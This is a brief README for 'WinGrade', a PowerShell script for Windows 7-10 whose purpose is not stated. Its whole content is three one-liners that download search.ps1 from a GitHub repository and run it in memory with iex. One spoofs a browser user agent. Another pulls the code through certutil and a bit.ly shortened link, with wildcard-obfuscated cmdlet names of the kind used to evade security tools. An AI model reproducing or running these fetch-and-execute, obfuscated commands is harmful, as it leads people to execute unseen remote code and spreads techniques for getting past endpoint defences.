# WinGrade

You can execute it in every Windows Operating System from Windows 7 - 10.

You don't have to Download the Program directly at github.


Just execute [CMD]:

powershell "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1')"

or

powershell "$down=New-Object Net.WebClient;$down.Headers['User-Agent']='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19';$down.DownloadString('https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1')|iex"

or

```
powershell "iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{`$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-Skip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{`$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join'`r`n'))"
```

In the Windows Command Prompt.


This Script is still in the early Alpha release!!! And has some bugs
